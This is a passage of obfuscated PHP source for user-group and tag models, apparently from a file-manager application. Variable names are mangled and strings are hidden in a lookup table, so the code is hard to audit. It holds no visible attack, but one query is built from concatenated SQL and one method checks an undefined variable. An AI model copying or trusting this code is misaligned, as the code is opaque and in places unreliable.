as $Ã…¯±Óˆ => $Ì¼¡¨òæ) { $åˆüÏõ¨[] = array($·ÂòÙ³[1491], $Ì¼¡¨òæ, $·ÂòÙ³[2200], $Ã…¯±Óˆ + 1); } $this->saveAll($åˆüÏõ¨); } public function listData() { $íµ–ıû = $this->_makeOrder()->selectPage(50); $this->_listDataApply($íµ–ıû[$_SERVER[œ—üé‹ê][446]]); return $íµ–ıû; } private function _makeOrder($ÀöÆóÜ = '') { $ñ“–¥¸ =& $_SERVER[œ—üé‹ê]; $¿à¼‹ü† = array($ñ“–¥¸[1491], $ñ“–¥¸[32], $ñ“–¥¸[2167], $ñ“–¥¸[231]); $ŸŠ¦ƒ— = array($ñ“–¥¸[537] => $ñ“–¥¸[538], $ñ“–¥¸[539] => $ñ“–¥¸[540]); $¢šÔÍöÜ = Input::get($ñ“–¥¸[544], $ñ“–¥¸[7], $ñ“–¥¸[2182], $¿à¼‹ü†); $—ØÄúÌÔ = Input::get($ñ“–¥¸[545], $ñ“–¥¸[7], $ñ“–¥¸[2273], array($ñ“–¥¸[2273], $ñ“–¥¸[539])); $—ØÄúÌÔ = $ŸŠ¦ƒ—[$—ØÄúÌÔ]; $ÀöÆóÜ = $ÀöÆóÜ . "{$¢šÔÍöÜ}\x20{$—ØÄúÌÔ}\x2c\40\147\162\157\x75\x70\x49\104\x20\x61\x73\143"; return $this->order($ÀöÆóÜ); } public function listChild($Ã«Ã–¯Ö) { $Ï¬ó =& $_SERVER[œ—üé‹ê]; $Ü‘¹íøî = $this->where(array($Ï¬ó[190] => $Ã«Ã–¯Ö))->_makeOrder()->selectPage(200); $this->_listDataApply($Ü‘¹íøî[$Ï¬ó[446]]); return $Ü‘¹íøî; } public function listChildIds($øïÈ¨É) { $İ¢‹í†Ş =& $_SERVER[œ—üé‹ê]; if (is_string($ÇÁ·ìÍ¨)) { $øïÈ¨É = explode($İ¢‹í†Ş[50], $øïÈ¨É); } $‡Ğ¾¦Ë = $this->where(array($İ¢‹í†Ş[1491] => array($İ¢‹í†Ş[7], $øïÈ¨É)))->field($İ¢‹í†Ş[2274])->select(); if (!$‡Ğ¾¦Ë) { return !1; } $îÏÄ§¸„ = array(); foreach ($‡Ğ¾¦Ë as $ÀµÆöùñ) { $îÏÄ§¸„[] = "\x73\145\154\x65\143\164\x20\147\162\x6f\165\160\111\104\x20\146\162\157\x6d\x20\140\147\x72\x6f\165\x70\140\x20\x77\150\145\162\145\x20\160\141\162\x65\x6e\164\114\x65\166\x65\154\40\x6c\151\x6b\145\x20\47{$ÀµÆöùñ[$İ¢‹í†Ş[604]]}{$ÀµÆöùñ[$İ¢‹í†Ş[1491]]}\54\45\47"; } $îÏÄ§¸„ = implode($İ¢‹í†Ş[2275], $îÏÄ§¸„); $‡Ğ¾¦Ë = $this->query($îÏÄ§¸„); if (!$‡Ğ¾¦Ë) { return array(); } $øïÈ¨É = array_to_keyvalue($‡Ğ¾¦Ë, $İ¢‹í†Ş[12], $İ¢‹í†Ş[1491]); return array_unique($øïÈ¨É); } public function listByID($‰Œñ·ƒ) { $Œ¹ËæÓ =& $_SERVER[œ—üé‹ê]; if (!$‰Œñ·ƒ) { return array(); } $ùœ—Ú’“ = array($Œ¹ËæÓ[1491] => array($Œ¹ËæÓ[7], $‰Œñ·ƒ)); $™ô™˜•¼ = $this->where($ùœ—Ú’“)->select(); $™ô™˜•¼ = array_sort_keep($™ô™˜•¼, $Œ¹ËæÓ[1491], $‰Œñ·ƒ); $this->_listDataApply($™ô™˜•¼); return $™ô™˜•¼; } public function listSearch($ı¦£Ø¹) { $ºşÛáå… =& $_SERVER[œ—üé‹ê]; $ëã«ûÁù = trim($ı¦£Ø¹[$ºşÛáå…[2276]]); $Ú‰Ø’Ó“ = explode($ºşÛáå…[53], $ëã«ûÁù); if (!$ëã«ûÁù || count($Ú‰Ø’Ó“) == 1) { return $this->listSearchNow($ı¦£Ø¹); } $Î†«ßøç = array($ºşÛáå…[446] => array()); foreach ($Ú‰Ø’Ó“ as $±Š¸ºñ) { if (!trim($±Š¸ºñ)) { continue; } $ı¦£Ø¹[$ºşÛáå…[2276]] = $±Š¸ºñ; $ã×Ê‰Û = $this->listSearchNow($ı¦£Ø¹); $Î†«ßøç[$ºşÛáå…[446]] = array_merge($Î†«ßøç[$ºşÛáå…[446]], $ã×Ê‰Û[$ºşÛáå…[446]]); } $Î†«ßøç[$ºşÛáå…[446]] = array_unique_by_key($Î†«ßøç[$ºşÛáå…[446]], $ºşÛáå…[1491]); $Î†«ßøç[$ºşÛáå…[443]] = array($ºşÛáå…[444] => count($Î†«ßøç[$ºşÛáå…[446]]), $ºşÛáå…[439] => 20, $ºşÛáå…[428] => 1, $ºşÛáå…[445] => 1); return $Î†«ßøç; } public function listSearchNow($™èÍéÒç) { $âò²îµ½ =& $_SERVER[œ—üé‹ê]; $ø –æò = trim($™èÍéÒç[$âò²îµ½[2276]]); $ï‚Î¯Úê = isset($™èÍéÒç[$âò²îµ½[2277]]) ? $™èÍéÒç[$âò²îµ½[2277]] : !1; if (!trim($ø –æò)) { return !1; } $ø –æò = str_replace($âò²îµ½[2278], $âò²îµ½[2279], $ø –æò); $Û¦ÃğôÑ = array($âò²îµ½[1491] => array($âò²îµ½[473], "{$ø –æò}\45"), $âò²îµ½[32] => array($âò²îµ½[473], "\45{$ø –æò}\45"), $âò²îµ½[1167] => $âò²îµ½[2280]); if ($ï‚Î¯Úê) { $¼ó­Á¶Ø = $this->getInfoSimple($ï‚Î¯Úê); $İæĞÙµ‡ = $¼ó­Á¶Ø[$âò²îµ½[604]] . $ï‚Î¯Úê . $âò²îµ½[636]; $Û¦ÃğôÑ = array($Û¦ÃğôÑ, array($âò²îµ½[604] => array($âò²îµ½[473], $İæĞÙµ‡))); } $Û¦ÃğôÑ = $this->parseWhereLike($Û¦ÃğôÑ); $ÚşøçÒ = $this->_makeOrder()->where($Û¦ÃğôÑ)->selectPage(20); $ÚşøçÒ = $ÚşøçÒ ? $ÚşøçÒ : array($âò²îµ½[446] => array(), $âò²îµ½[443] => array()); if (!$ÚşøçÒ || count($ÚşøçÒ[$âò²îµ½[446]]) < 5 && Input::check($ø –æò, $âò²îµ½[393])) { $·É›¶¬Î = $this->groupChildrenAll($ï‚Î¯Úê); $ú¾Ã¦à… = $this->_searchFromMeta($âò²îµ½[551], $ø –æò, 10, $·É›¶¬Î); $×çÉ‡Ş† = $this->_searchFromMeta($âò²îµ½[552], $ø –æò, 10, $·É›¶¬Î); $¹º“»İš = array_merge($ú¾Ã¦à…, $×çÉ‡Ş†, $ÚşøçÒ[$âò²îµ½[446]]); $ÚşøçÒ[$âò²îµ½[446]] = array_unique_by_key($¹º“»İš, $âò²îµ½[1491]); $ÚşøçÒ[$âò²îµ½[443]][$âò²îµ½[444]] = count($ÚşøçÒ[$âò²îµ½[446]]); $ÚşøçÒ[$âò²îµ½[443]][$âò²îµ½[445]] = ceil($ÚşøçÒ[$âò²îµ½[443]][$âò²îµ½[444]] / $ÚşøçÒ[$âò²îµ½[443]][$âò²îµ½[439]]); } $this->_listDataApply($ÚşøçÒ[$âò²îµ½[446]]); return $ÚşøçÒ; } protected function groupChildrenAll($»š´ğ†Œ) { $âúƒÇĞ =& $_SERVER[œ—üé‹ê]; if (!$»š´ğ†Œ) { return !1; } if (!is_array($»š´ğ†Œ)) { $»š´ğ†Œ = array($»š´ğ†Œ); } $îğ±¹Çœ = $»š´ğ†Œ; foreach ($»š´ğ†Œ as $ œ‚ğÌ‘) { $Ş‘İÖÕ = $this->getInfoSimple($ œ‚ğÌ‘); $ÓôË¤÷ğ = array($âúƒÇĞ[604] => array($âúƒÇĞ[473], $Ş‘İÖÕ[$âúƒÇĞ[604]] . $ œ‚ğÌ‘ . $âúƒÇĞ[636])); $³¸İ‘ºû = $this->field($âúƒÇĞ[1491])->where($ÓôË¤÷ğ)->select(); $îğ±¹Çœ = array_merge($îğ±¹Çœ, array_to_keyvalue($³¸İ‘ºû, $âúƒÇĞ[12], $âúƒÇĞ[1491])); } return array_unique($îğ±¹Çœ); } private function _searchFromMeta($Óû¿ŒÙ½, $Ğ·¼¥âŠ, $Ñ¦ÌŸÄ, $Öö»Ì®¥) { $Æ×˜›òÕ =& $_SERVER[œ—üé‹ê]; $Ğ·¼¥âŠ = strtolower($Ğ·¼¥âŠ); $»¯Å¯‡° = array($Æ×˜›òÕ[95] => $Óû¿ŒÙ½, $Æ×˜›òÕ[451] => array($Æ×˜›òÕ[473], "\x25{$Ğ·¼¥âŠ}\45")); $»¯Å¯‡° = $this->parseWhereLike($»¯Å¯‡°); if ($Öö»Ì®¥) { $»¯Å¯‡°[$Æ×˜›òÕ[1491]] = array($Æ×˜›òÕ[7], $Öö»Ì®¥); } $È¸Ùƒº = Model($Æ×˜›òÕ[2281])->where($»¯Å¯‡°)->limit($Ñ¦ÌŸÄ)->select(); if (!$È¸Ùƒº) { return array(); } $È¸Ùƒº = array_to_keyvalue($È¸Ùƒº, $Æ×˜›òÕ[12], $Æ×˜›òÕ[1491]); $âË¹úÁè = $this->where(array($Æ×˜›òÕ[2265] => array($Æ×˜›òÕ[7], $È¸Ùƒº)))->select(); if (!$âË¹úÁè) { return array(); } return $âË¹úÁè; } protected function _listDataApplyItem($½ËÃò‹Ì) { $¨ô€¶’ê = array($½ËÃò‹Ì); $this->_listDataApply($¨ô€¶’ê); return $¨ô€¶’ê[0]; } protected function _listDataApply(&$‘Ü“•¯Ï) { $‰†¨û­ä =& $_SERVER[œ—üé‹ê]; if (!$‘Ü“•¯Ï) { return; } $¿¤ó˜¿ß = array_to_keyvalue($‘Ü“•¯Ï, $‰†¨û­ä[12], $‰†¨û­ä[1491]); $this->_listAppendChildren($‘Ü“•¯Ï); $this->_listAppendChildrenMember($‘Ü“•¯Ï); $this->_listAppendMeta($‘Ü“•¯Ï, $¿¤ó˜¿ß); $this->_listAppendParent($‘Ü“•¯Ï); $this->_listAppendSourceRoot($‘Ü“•¯Ï, $¿¤ó˜¿ß); } private function _listAppendChildren(&$ŞöŒÃ–Ã) { $Öçº»ºŒ =& $_SERVER[œ—üé‹ê]; $Ñ¼Í€ø¹ = array_to_keyvalue($ŞöŒÃ–Ã, $Öçº»ºŒ[12], $Öçº»ºŒ[1491]); $´³²Ãû× = array($Öçº»ºŒ[190] => array($Öçº»ºŒ[7], $Ñ¼Í€ø¹)); $ª†ÙÓŸò = array($Öçº»ºŒ[190], $Öçº»ºŒ[2282] => $Öçº»ºŒ[585]); $û‘¨ğ = $this->field($ª†ÙÓŸò)->where($´³²Ãû×)->group($Öçº»ºŒ[190])->select(); $Å²ÎæÆ™ = array_to_keyvalue($û‘¨ğ, $Öçº»ºŒ[190], $Öçº»ºŒ[585]); foreach ($ŞöŒÃ–Ã as &$¡ÈûæšÍ) { $ÀÚœ×ï = $¡ÈûæšÍ[$Öçº»ºŒ[1491]]; $¡ÈûæšÍ[$Öçº»ºŒ[2283]] = isset($Å²ÎæÆ™[$ÀÚœ×ï]) ? intval($Å²ÎæÆ™[$ÀÚœ×ï]) : !1; } unset($¡ÈûæšÍ); } private function _listAppendChildrenMember(&$­î¡åı) { $­øÂßå =& $_SERVER[œ—üé‹ê]; $×½ãê‘ï = array_to_keyvalue($­î¡åı, $­øÂßå[12], $­øÂßå[1491]); $÷ŒÉÌŒ = array($­øÂßå[1491] => array($­øÂßå[7], $×½ãê‘ï)); $ÖÁë„âÛ = array($­øÂßå[1491], $­øÂßå[2282] => $­øÂßå[585]); $¡„Î¹æÄ = Model($­øÂßå[2272])->field($ÖÁë„âÛ)->where($÷ŒÉÌŒ)->group($­øÂßå[1491])->select(); $ÈÛÊœ×ã = array_to_keyvalue($¡„Î¹æÄ, $­øÂßå[1491], $­øÂßå[585]); foreach ($­î¡åı as &$¼Ëç”Ñ) { $£Î¶¯îì = $¼Ëç”Ñ[$­øÂßå[1491]]; $¼Ëç”Ñ[$­øÂßå[2284]] = isset($ÈÛÊœ×ã[$£Î¶¯îì]) ? intval($ÈÛÊœ×ã[$£Î¶¯îì]) : !1; } unset($¼Ëç”Ñ); } private function _listAppendMeta(&$ú‡Ş¢¸, $£Ä¤ºĞ) { $¦ÏÖ¯¥â =& $_SERVER[œ—üé‹ê]; $’¿İã˜ = array($¦ÏÖ¯¥â[1491] => array($¦ÏÖ¯¥â[7], $£Ä¤ºĞ)); $íí£à‰Ñ = Model($¦ÏÖ¯¥â[2271])->where($’¿İã˜)->select(); $íí£à‰Ñ = array_to_keyvalue_group($íí£à‰Ñ, $¦ÏÖ¯¥â[1491]); foreach ($íí£à‰Ñ as &$ïêı²ä³) { $ïêı²ä³ = array_to_keyvalue($ïêı²ä³, $¦ÏÖ¯¥â[95], $¦ÏÖ¯¥â[451]); } unset($ïêı²ä³); foreach ($ú‡Ş¢¸ as &$¨Àä¶ÙŒ) { $¨Àä¶ÙŒ[$¦ÏÖ¯¥â[555]] = array(); if (isset($íí£à‰Ñ[$¨Àä¶ÙŒ[$¦ÏÖ¯¥â[1491]]])) { $¨Àä¶ÙŒ[$¦ÏÖ¯¥â[555]] = $íí£à‰Ñ[$¨Àä¶ÙŒ[$¦ÏÖ¯¥â[1491]]]; } } unset($¨Àä¶ÙŒ); } protected function parentLevelArray($èåÇÆå¼) { $í©‰û—† =& $_SERVER[œ—üé‹ê]; $èåÇÆå¼ = explode($í©‰û—†[50], trim($èåÇÆå¼, $í©‰û—†[50])); $èåÇÆå¼ = array_remove_value($èåÇÆå¼, $í©‰û—†[228]); return $èåÇÆå¼; } protected function parentInGroup($ÌÁ¨ß†, $ëª¤œÖ) { $Â¿ñçĞ =& $_SERVER[œ—üé‹ê]; $…»Ï¾ÏÜ = $this->getInfoSimple($ÌÁ¨ß†); if (!$…»Ï¾ÏÜ) { return !0; } $×½Ì¶œî = $this->parentLevelArray($…»Ï¾ÏÜ[$Â¿ñçĞ[604]]); $×½Ì¶œî[] = $ÌÁ¨ß†; foreach ($×½Ì¶œî as $ÌÁ¨ß†) { if (in_array($ÌÁ¨ß† . $Â¿ñçĞ[12], $ëª¤œÖ)) { return !0; } } return !1; } private function _listAppendParent(&$Ø‰şìêÈ) { $×æ‘³ëà =& $_SERVER[œ—üé‹ê]; $ÃÎ‡îˆÜ = array(); foreach ($Ø‰şìêÈ as &$ÙëõÉ—Š) { $ÃÎ‡îˆÜ[$ÙëõÉ—Š[$×æ‘³ëà[1491]]] = $ÙëõÉ—Š[$×æ‘³ëà[32]]; $»æö¦³Ï = $this->parentLevelArray($ÙëõÉ—Š[$×æ‘³ëà[604]]); foreach ($»æö¦³Ï as $†À„®Óæ) { if (!isset($ÃÎ‡îˆÜ[$†À„®Óæ])) { $ÃÎ‡îˆÜ[$†À„®Óæ] = 0; } } } unset($ÙëõÉ—Š); foreach ($ÃÎ‡îˆÜ as $®Ò÷ïÎ => $ƒ–Ô—Ñ®) { if ($ƒ–Ô—Ñ®) { continue; } $†Ä”„‚• = $this->getInfoSimple($®Ò÷ïÎ); $ÃÎ‡îˆÜ[$®Ò÷ïÎ] = $†Ä”„‚•[$×æ‘³ëà[32]]; } $²ÒáÓ¥÷ = $GLOBALS[$×æ‘³ëà[6]][$×æ‘³ëà[92]][$×æ‘³ëà[2285]]; if (KodUser::isRoot()) { $²ÒáÓ¥÷ = !1; } foreach ($Ø‰şìêÈ as &$ÙëõÉ—Š) { $»æö¦³Ï = $this->parentLevelArray($ÙëõÉ—Š[$×æ‘³ëà[604]]); $ˆ›Ñƒƒ™ = $×æ‘³ëà[12]; foreach ($»æö¦³Ï as $®Ò÷ïÎ => $†À„®Óæ) { if ($²ÒáÓ¥÷ && $®Ò÷ïÎ == 0) { continue; } $ˆ›Ñƒƒ™ .= $ÃÎ‡îˆÜ[$†À„®Óæ] . $×æ‘³ëà[8]; } if ($»æö¦³Ï) { $ˆ›Ñƒƒ™ .= $ÙëõÉ—Š[$×æ‘³ëà[32]]; } $ÙëõÉ—Š[$×æ‘³ëà[609]] = str_replace($×æ‘³ëà[254], $×æ‘³ëà[8], $ˆ›Ñƒƒ™); } unset($ÙëõÉ—Š); } private function _listAppendSourceRoot(&$ÆƒÕõ¸, $áº×ÁÙ) { $Éæ¾ì‹â =& $_SERVER[œ—üé‹ê]; $Öë®Å· = Model($Éæ¾ì‹â[942])->listSourceRoot(SourceModel::TYPE_GROUP, $áº×ÁÙ); $Öë®Å· = array_to_keyvalue($Öë®Å·, $Éæ¾ì‹â[589]); $Öë®Å· = array_remove_key($Öë®Å·, $Éæ¾ì‹â[589]); foreach ($ÆƒÕõ¸ as &$¾üÒ®) { $¾üÒ®[$Éæ¾ì‹â[90]] = $Öë®Å·[$¾üÒ®[$Éæ¾ì‹â[1491]]] ? $Öë®Å·[$¾üÒ®[$Éæ¾ì‹â[1491]]] : array(); } unset($¾üÒ®); } protected function groupMerge($•àêÚ‡) { $•àêÚ‡ = array_values(array_unique($•àêÚ‡)); $™ßªı±‰ = array(); for ($ş¬¶ñÖ¹ = 0; $ş¬¶ñÖ¹ < count($•àêÚ‡); $ş¬¶ñÖ¹++) { $¯ı—­§ = !1; for ($´ì¨œı = 0; $´ì¨œı < count($•àêÚ‡); $´ì¨œı++) { if ($ş¬¶ñÖ¹ == $´ì¨œı) { continue; } if ($this->isParentOf($•àêÚ‡[$´ì¨œı], $•àêÚ‡[$ş¬¶ñÖ¹])) { $¯ı—­§ = !0; break; } } if (!$¯ı—­§) { $™ßªı±‰[] = $•àêÚ‡[$ş¬¶ñÖ¹]; } } return $™ßªı±‰; } protected function isParentOf($ß›Œ¥½è, $ÈŒŒÁ‹í) { $¢ı±¸×Ö =& $_SERVER[œ—üé‹ê]; if (!$ß›Œ¥½è || !$ÈŒŒÁ‹í || $ß›Œ¥½è == $ÈŒŒÁ‹í) { return !1; } $®â¼¥ºÊ = $this->getInfoSimple($ß›Œ¥½è); $é ×á…Á = $this->getInfoSimple($ÈŒŒÁ‹í); $¶ÔôŒ = $®â¼¥ºÊ[$¢ı±¸×Ö[604]] . $ß›Œ¥½è . $¢ı±¸×Ö[50]; if (substr($é ×á…Á[$¢ı±¸×Ö[604]], 0, strlen($¶ÔôŒ)) == $¶ÔôŒ) { return !0; } return !1; } public function groupShowRoot($¢Ïş¨Áˆ, $şæå¯’ = false) { $¨ŞÑÎäØ =& $_SERVER[œ—üé‹ê]; $á´‘‰œİ = $this->getInfo($¢Ïş¨Áˆ); if (!$á´‘‰œİ) { return array(); } $¶õÑ›»‹ = $this->parentLevelArray($á´‘‰œİ[$¨ŞÑÎäØ[604]]); $Äé¤ä = array($¢Ïş¨Áˆ); if (count($¶õÑ›»‹) == 0) { return $Äé¤ä; } if ($şæå¯’ && count($¶õÑ›»‹) == 1) { return $Äé¤ä; } if (!$á´‘‰œİ[$¨ŞÑÎäØ[555]] || !isset($á´‘‰œİ[$¨ŞÑÎäØ[555]][$¨ŞÑÎäØ[2266]]) || $á´‘‰œİ[$¨ŞÑÎäØ[555]][$¨ŞÑÎäØ[2266]] == $¨ŞÑÎäØ[953]) { return $this->groupShowRoot($¶õÑ›»‹[count($¶õÑ›»‹) - 1], $şæå¯’); } if ($á´‘‰œİ[$¨ŞÑÎäØ[555]][$¨ŞÑÎäØ[2266]] == $¨ŞÑÎäØ[432]) { $…Û„ÂØ = explode($¨ŞÑÎäØ[50], $á´‘‰œİ[$¨ŞÑÎäØ[555]][$¨ŞÑÎäØ[2267]]); if ($…Û„ÂØ) { $Äé¤ä = array_merge($Äé¤ä, $…Û„ÂØ); } } return $Äé¤ä; } protected function resetParentLevel() { $áÏ‹Ì© =& $_SERVER[œ—üé‹ê]; $¨‰ß±¤å = $áÏ‹Ì©[1491]; $ñìÜ–Ë‘ = $this->select(); $ñìÜ–Ë‘ = array_to_keyvalue($ñìÜ–Ë‘, $¨‰ß±¤å); foreach ($ñìÜ–Ë‘ as $ïß“Àº) { $ªøŸà¸ = $ïß“Àº; $ºàïæÎË = array(); while ($ªøŸà¸[$áÏ‹Ì©[190]] != 0) { $ºàïæÎË[] = $ªøŸà¸[$áÏ‹Ì©[190]]; $ªøŸà¸ = $ñìÜ–Ë‘[$ªøŸà¸[$áÏ‹Ì©[190]]]; } $ºàïæÎË[] = 0; $ºàïæÎË = $áÏ‹Ì©[50] . implode($áÏ‹Ì©[50], array_reverse($ºàïæÎË)) . $áÏ‹Ì©[50]; $this->setNamePinyin($ïß“Àº[$¨‰ß±¤å], $ïß“Àº[$áÏ‹Ì©[32]]); $this->where(array($¨‰ß±¤å => $ïß“Àº[$¨‰ß±¤å]))->save(array($áÏ‹Ì©[674] => $ºàïæÎË)); } return $ñìÜ–Ë‘; } public function groupNameAuto($Æ¬ÈÊôâ, $÷˜¨ºÎ) { $¥¾È¬»¾ =& $_SERVER[œ—üé‹ê]; $ïúü¡”Ø = $this->where(array($¥¾È¬»¾[492] => $Æ¬ÈÊôâ))->getField($¥¾È¬»¾[32], !0); if (!$ïúü¡”Ø || !in_array($÷˜¨ºÎ, $ïúü¡”Ø)) { return $÷˜¨ºÎ; } for ($¿‚œï¼€ = 1; $¿‚œï¼€ <= count($ïúü¡”Ø) + 1; $¿‚œï¼€++) { $Éôù‘ÍÂ = $÷˜¨ºÎ . "\50{$¿‚œï¼€}\51"; if (!in_array($Éôù‘ÍÂ, $ïúü¡”Ø)) { return $Éôù‘ÍÂ; } } } public function groupSwitch($—´¿‡‘Ä, $ì¤ÈĞ¨í) { $ßèÅÇĞ€ =& $_SERVER[œ—üé‹ê]; $Üï…æûÛ = array($ßèÅÇĞ€[1491] => array($ßèÅÇĞ€[7], array($—´¿‡‘Ä, $ì¤ÈĞ¨í))); $ô­Ï»®Á = $this->where($Üï…æûÛ)->select(); $ô­Ï»®Á = array_to_keyvalue($ô­Ï»®Á, $ßèÅÇĞ€[1491]); $´œøœ· = _get($ô­Ï»®Á, $—´¿‡‘Ä); $ÈÖæ±ß½ = _get($ô­Ï»®Á, $ì¤ÈĞ¨í); if (!$´œøœ· || !$ÈÖæ±ß½ || $´œøœ·[$ßèÅÇĞ€[190]] == 0) { return !1; } if ($´œøœ·[$ßèÅÇĞ€[1491]] == $ÈÖæ±ß½[$ßèÅÇĞ€[1491]]) { return !1; } if (strpos($ÈÖæ±ß½[$ßèÅÇĞ€[604]], $´œøœ·[$ßèÅÇĞ€[604]] . $´œøœ·[$ßèÅÇĞ€[1491]] . $ßèÅÇĞ€[50]) === 0) { return !1; } $Üï…æûÛ = array($ßèÅÇĞ€[1491] => $—´¿‡‘Ä); $Éß‰êğ  = Model($ßèÅÇĞ€[2272])->where($Üï…æûÛ)->select(); if (!$Éß‰êğ ) { $Éß‰êğ  = array(); } foreach ($Éß‰êğ  as $ÔÊàÄ¯¾) { $±¬Œñ§Ä = $ÔÊàÄ¯¾[$ßèÅÇĞ€[1589]]; $Üï…æûÛ = array($ßèÅÇĞ€[1589] => $±¬Œñ§Ä, $ßèÅÇĞ€[1491] => $ì¤ÈĞ¨í); $ÉÉÏñ‚è = Model($ßèÅÇĞ€[2272])->where($Üï…æûÛ)->find(); if (!$ÉÉÏñ‚è) { $˜ÎœéÉŠ = array($ì¤ÈĞ¨í => $ÔÊàÄ¯¾[$ßèÅÇĞ€[1637]]); Model($ßèÅÇĞ€[617])->userGroupAdd($±¬Œñ§Ä, $˜ÎœéÉŠ); } Model($ßèÅÇĞ€[617])->userGroupRemove($±¬Œñ§Ä, $—´¿‡‘Ä); } $Üï…æûÛ = array($ßèÅÇĞ€[188] => 2, $ßèÅÇĞ€[190] => 0, $ßèÅÇĞ€[500] => 1, $ßèÅÇĞ€[589] => array($ßèÅÇĞ€[7], array($—´¿‡‘Ä, $ì¤ÈĞ¨í))); $ÆÊÓûå‘ = Model($ßèÅÇĞ€[942])->where($Üï…æûÛ)->field($ßèÅÇĞ€[2286])->select(); $ÆÊÓûå‘ = array_to_keyvalue($ÆÊÓûå‘, $ßèÅÇĞ€[589], $ßèÅÇĞ€[191]); $êĞ¾§úÆ = !empty($ÆÊÓûå‘[$—´¿‡‘Ä]) ? $ÆÊÓûå‘[$—´¿‡‘Ä] : !1; if ($êĞ¾§úÆ) { if (!$ÆÊÓûå‘[$ì¤ÈĞ¨í]) { $ÆÊÓûå‘[$ì¤ÈĞ¨í] = Model($ßèÅÇĞ€[942])->groupRootAdd($ì¤ÈĞ¨í); } $¼àÃ„Î = $ÆÊÓûå‘[$ì¤ÈĞ¨í]; $Üï…æûÛ = array($ßèÅÇĞ€[190] => $êĞ¾§úÆ); $ÆÊÓûå‘ = Model($ßèÅÇĞ€[942])->where($Üï…æûÛ)->field($ßèÅÇĞ€[2287])->select(); if (!$ÆÊÓûå‘) { $ÆÊÓûå‘ = array(); } Model($ßèÅÇĞ€[942])->moveClearAuth = !1; foreach ($ÆÊÓûå‘ as $¿×«·øİ) { $–ÆÎ½ôŸ = $¿×«·øİ[$ßèÅÇĞ€[500]] == $ßèÅÇĞ€[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ßèÅÇĞ€[942])->move($¿×«·øİ[$ßèÅÇĞ€[191]], $¼àÃ„Î, $–ÆÎ½ôŸ); } Model($ßèÅÇĞ€[942])->moveClearAuth = !0; $Üï…æûÛ = array($ßèÅÇĞ€[188] => 2, $ßèÅÇĞ€[589] => $—´¿‡‘Ä); $µ„ıª±ó = array($ßèÅÇĞ€[589] => $ì¤ÈĞ¨í); Model($ßèÅÇĞ€[2288])->where($Üï…æûÛ)->save($µ„ıª±ó); Model($ßèÅÇĞ€[2289])->where($Üï…æûÛ)->save($µ„ıª±ó); } $this->_changeChildLevel($ô­Ï»®Á[$—´¿‡‘Ä], $ô­Ï»®Á[$ì¤ÈĞ¨í], !0); $this->where(array($ßèÅÇĞ€[190] => $—´¿‡‘Ä))->save(array($ßèÅÇĞ€[190] => $ì¤ÈĞ¨í)); $this->_clearChildrenCache($ô­Ï»®Á[$ì¤ÈĞ¨í]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($çıÌÓö) { $ ßªò¤Ù =& $_SERVER[œ—üé‹ê]; return array($ ßªò¤Ù[2290] => array($çıÌÓö[0], $ ßªò¤Ù[2291]), $ ßªò¤Ù[2292] => array($çıÌÓö[0], $ ßªò¤Ù[2293])); } protected function ___get($õûé™Àî) { $üŒ³±ïÙ =& $_SERVER[œ—üé‹ê]; $‰àŒíùı = Model($üŒ³±ïÙ[605])->metaGet($õûé™Àî, $üŒ³±ïÙ[2294]); $Ê¡¤”Şª = json_decode($‰àŒíùı, !0); return $Ê¡¤”Şª ? $Ê¡¤”Şª : array($üŒ³±ïÙ[2295] => $üŒ³±ïÙ[91], $üŒ³±ïÙ[446] => array()); } protected function ___listData($Ã”Û) { $Å’‘ÉÉÉ =& $_SERVER[œ—üé‹ê]; $Ó¤´´°Œ = array($Å’‘ÉÉÉ[1965] => 0, $Å’‘ÉÉÉ[573] => array($Å’‘ÉÉÉ[2296], 0), $Å’‘ÉÉÉ[511] => $Å’‘ÉÉÉ[1487] . $Ã”Û); $Ú¡«‡‚ú = $Å’‘ÉÉÉ[2297]; $ù¨Òœœ‰ = $this->field($Ú¡«‡‚ú)->where($Ó¤´´°Œ)->order($Å’‘ÉÉÉ[2298])->select(); return $ù¨Òœœ‰ ? $ù¨Òœœ‰ : array(); } protected function set($—ˆ„áÜ, $¹ùãÆœ“) { $ÒÕ§åÂÙ =& $_SERVER[œ—üé‹ê]; $¹ùãÆœ“ = $¹ùãÆœ“ ? $¹ùãÆœ“ : array($ÒÕ§åÂÙ[2295] => $ÒÕ§åÂÙ[91], $ÒÕ§åÂÙ[446] => array()); return Model($ÒÕ§åÂÙ[605])->metaSet($—ˆ„áÜ, $ÒÕ§åÂÙ[2294], json_encode($¹ùãÆœ“)); } protected function getByTagID($æıÑ©‹İ, $Ä‘í®«´) { $áó«ğâÎ =& $_SERVER[œ—üé‹ê]; if (!$æıÑ©‹İ || !$Ä‘í®«´) { return !1; } if (!Model($áó«ğâÎ[605])->getInfoSimple($æıÑ©‹İ)) { return !1; } $«šŸ“ = $this->get($æıÑ©‹İ); if (!$«šŸ“ || !isset($«šŸ“[$áó«ğâÎ[446]])) { return !1; } $ÒÓ—Æò = array_find_by_field($«šŸ“[$áó«ğâÎ[446]], $áó«ğâÎ[487], $Ä‘í®«´); return is_array($ÒÓ—Æò) ? $ÒÓ—Æò : !1; } public function listSource($§Œ”Øù, $ïö¼áº) { $Â•ÁçÑï =& $_SERVER[œ—üé‹ê]; if ($ïö¼áº && !is_array($ïö¼áº)) { $ïö¼áº = array($ïö¼áº); } $œœºİû = $this->get($§Œ”Øù); $İÜ÷ŠÄ = array_to_keyvalue($œœºİû[$Â•ÁçÑï[446]], $Â•ÁçÑï[487]); $Å¾˜¦³ = array_to_keyvalue($œœºİû[$Â•ÁçÑï[598]], $Â•ÁçÑï[487]); $ú¯À‰ÌÇ = $this->listData($§Œ”Øù); $®”äë = array(); foreach ($ïö¼áº as $ô ’ŒÚ¹) { $íÛÉ“ç = $İÜ÷ŠÄ[$ô ’ŒÚ¹]; $²Ç¹‚ö€ = _get($íÛÉ“ç, $Â•ÁçÑï[598]); if (!$íÛÉ“ç || !$²Ç¹‚ö€ || !$Å¾˜¦³[$²Ç¹‚ö€]) { continue; } if (!$®”äë[$²Ç¹‚ö€]) { $®”äë[$²Ç¹‚ö€] = array(); } $®”äë[$²Ç¹‚ö€][] = $ô ’ŒÚ¹; } $Õ¾ ®ˆ• = array(); $·™ï„ = array(); foreach ($ú¯À‰ÌÇ as $áŠóæëŠ) { $Àò…Û‘š = $áŠóæëŠ[$Â•ÁçÑï[87]]; $íÛÉ“ç = 